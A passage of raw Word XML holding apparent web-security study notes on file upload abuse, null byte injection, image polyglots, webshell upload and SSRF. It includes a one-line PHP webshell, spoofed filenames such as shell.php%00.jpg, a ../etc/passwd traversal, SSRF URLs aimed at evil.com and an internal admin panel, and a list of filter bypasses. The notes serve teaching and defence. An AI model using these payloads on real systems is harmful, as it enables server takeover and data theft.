        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Uplo</w:t>
      </w:r>
      <w:r w:rsidR="008845E1">
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>ding .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>, .asp, .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>jsp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> or .exe instead of harmless files like .jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="001AB44C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>If stored in a web-accessible destination can lead to Remote Code Execution (RCE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B837146" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Extension Spoofing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C9D3D9C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>File names like:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57514DDB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="1080"/>
        </w:tabs>
        <w:ind w:left="1080"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Shell.php.jpg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (double extension)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6524AFA3" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="1080"/>
        </w:tabs>
        <w:ind w:left="1080"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Shell.PHP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (case variation)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B72DB54" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="1080"/>
        </w:tabs>
        <w:ind w:left="1080"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Shell.php%00.jpg (Null byte Injection) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1054FA90" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Overwriting / Path Traversal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="271D2002" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">If filenames are not randomized, attackers upload </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> → overwrites real homepage.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2361C153" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Using ../</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> in filename → attempt directory traversal.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78424366" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="106" w:name="_Toc208408577"/>
      <w:r>
        <w:t>Null Byte Injection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="106"/>
    </w:p>
    <w:p w14:paraId="21208D61" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A null byte is represented as \0.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78DC764F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>In C/C++ and low-level languages, a null byte marks the end of a string.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CB3BE1E" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Many older libraries, file handling functions, and interpreters stop reading at \0.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="569163D5" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="107" w:name="_Toc208408578"/>
      <w:r>
        <w:t>How it works:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="107"/>
    </w:p>
    <w:p w14:paraId="22AFC18A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Attacker appends null byte before safe extension. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA098D5" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Example: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>shell.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>\0.jpeg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B140B14" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Server side logic: Application checks only .jpeg (after null byte) → thinks it is safe.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AF9E716" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Underlying system: C-based file handler stops at \0 → treats file as </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>shell.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60233BB0" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="108" w:name="_Toc208408579"/>
      <w:r>
        <w:t>Image Polyglot</w:t>
      </w:r>
      <w:bookmarkEnd w:id="108"/>
    </w:p>
    <w:p w14:paraId="42B5C327" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A polyglot file is valid in multiple formats simultaneously.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="520C7E71" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Crafted to be:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="445B95A2" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>A valid image</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="088846DD" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>A valid script</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F134C0C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="109" w:name="_Toc208408580"/>
      <w:r>
        <w:t>Why Polyglot Works:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="109"/>
    </w:p>
    <w:p w14:paraId="5259584D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>File upload defenses usually check one property:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="489D6A33" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>File extension (.jpg, .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>png</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59FFF367" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>MIME type (Content-Type: image/jpeg)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B299E31" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Magic number (first few bytes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A6AD99" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>An image polyglot is crafted so:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="135E7A5C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Beginning of file contains valid image headers → passes magic number check</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A88E29B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Middle/end contains PHP/JS code → executed if interpreted as code.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="606A1D36" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="110" w:name="_Toc208408581"/>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Webshell</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Upload</w:t>
      </w:r>
      <w:bookmarkEnd w:id="110"/>
    </w:p>
    <w:p w14:paraId="61EF96B4" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Small script uploaded and executed on server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F755B6C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>Example: &lt;?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> system($_GET[‘</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>’]); ?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14410485" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Attacker gains remote access to run commands (reverse shell, privilege escalation).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D572455" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>Unrestricted Upload Location</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33198554" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If uploads go directly to /uploads/ under </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>webroot</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="751CC70C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Attacker uploads </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>shell.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6C0D07E6" w14:textId="2D84A4EA" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Access via </w:t>
      </w:r>
      <w:hyperlink r:id="rId11" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="008845E1" w:rsidRPr="008845E1">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://example.com/uploads/shell.php</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4AF4FC2A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Executes arbitrary code</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="337AA99B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Even non-executable files can be used in phishing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C96AB1" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="111" w:name="_Toc208408582"/>
      <w:r>
        <w:t>Server-Side Request Forgery (SSRF)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="111"/>
    </w:p>
    <w:p w14:paraId="610EB16F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>SSRF occurs when attacker tricks a vulnerable server into making HTTP requests to unintended locations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BB9E4D1" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="112" w:name="_Toc208408583"/>
      <w:r>
        <w:t>Why it exists:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="112"/>
    </w:p>
    <w:p w14:paraId="758BD235" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>Applications fetch external resources:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="100C2282" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Fetching URL for link preview</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C949464" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Importing files via URL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B0D9EE4" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>API integrations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44954D25" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="113" w:name="_Toc208408584"/>
      <w:r>
        <w:t>Normal Workflow:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="113"/>
    </w:p>
    <w:p w14:paraId="2EBD66C0" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>User enters URL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="331B9337" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Server validates → fetches resources → returns metadata</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43EB790D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="114" w:name="_Toc208408585"/>
      <w:r>
        <w:t>SSRF Vulnerability:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="114"/>
    </w:p>
    <w:p w14:paraId="3B8FB9EB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Attacker manipulates URL so server requests:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13DC502E" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Internal services</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05FCA618" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Metadata services</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="487C8EBB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Other protected endpoints</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4929F2D9" w14:textId="40E488A5" w:rsidR="00D75FD2" w:rsidRDefault="00D75FD2">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="115" w:name="_Toc208408586"/>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251658240" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="30776297" wp14:editId="627E022F">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>-2309</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4954467" cy="4052454"/>
            <wp:effectExtent l="0" t="0" r="0" b="5715"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="21529"/>
                <wp:lineTo x="21511" y="21529"/>
                <wp:lineTo x="21511" y="0"/>
                <wp:lineTo x="0" y="0"/>
              </wp:wrapPolygon>
            </wp:wrapTight>
            <wp:docPr id="847462505" name="Picture 1" descr="SSRF Comm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RF Common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4467" cy="4052454"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:bookmarkEnd w:id="115"/>
    </w:p>
    <w:p w14:paraId="6D7C759F" w14:textId="39B0A801" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="116" w:name="_Toc208408587"/>
      <w:r>
        <w:t>How SSRF is triggered:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="116"/>
    </w:p>
    <w:p w14:paraId="5AB93EDC" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>Example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FAD5F8F" w14:textId="70D8655A" w:rsidR="00B830E7" w:rsidRPr="008845E1" w:rsidRDefault="00353410">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Vulnerable </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>param</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:hyperlink r:id="rId13" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="008845E1" w:rsidRPr="008845E1">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-IN"/>
          </w:rPr>
          <w:t>http://example.com/preview?url=http://evil.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="008845E1" w:rsidRPr="008845E1">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09379811" w14:textId="6604F254" w:rsidR="00B830E7" w:rsidRPr="008845E1" w:rsidRDefault="00353410">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Attacker changes to: </w:t>
      </w:r>
      <w:hyperlink r:id="rId14" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="008845E1" w:rsidRPr="008845E1">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-IN"/>
          </w:rPr>
          <w:t>http://example.com/preview?url=http://127.0.0.1:8080/admin</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="008845E1" w:rsidRPr="008845E1">
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34D1709C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:r>
        <w:t>Server fetches internal admin panel → leaks content</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D9DF7F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="117" w:name="_Toc208408588"/>
      <w:r>
        <w:t>Types of SSRF</w:t>
      </w:r>
      <w:bookmarkEnd w:id="117"/>
    </w:p>
    <w:p w14:paraId="7E5FE845" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Basic SSRF → Direct request to internal resource</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="405E96CD" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Blind SSRF → Request not visible, but still happens</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07CC1A81" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Semi-Blind SSRF → Limited feedback (e.g., HTTP status code)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C218D26" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Out-of-Band SSRF → No direct response, but detected via DNS/HTTP callbacks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E30ACD0" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="118" w:name="_Toc208408589"/>
      <w:r>
        <w:t>Bypasses</w:t>
      </w:r>
      <w:bookmarkEnd w:id="118"/>
    </w:p>
    <w:p w14:paraId="5C62A8BD" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Block 127.0.0.1 → bypass with localhost, 0x7f000001, ::1, encoded formats</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FF03A31" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Block Private IP Ranges → use DNS rebinding, redirects</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DF55A58" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Schema Restriction (http/https only) → trick using other protocols</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5897B510" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>URL Parser Validation → exploit parser inconsistencies (extra slashes, @, fragments)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F0A1183" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>WAF Filtering Metadata URL → try alternative cloud metadata paths</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="504E9B3E" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
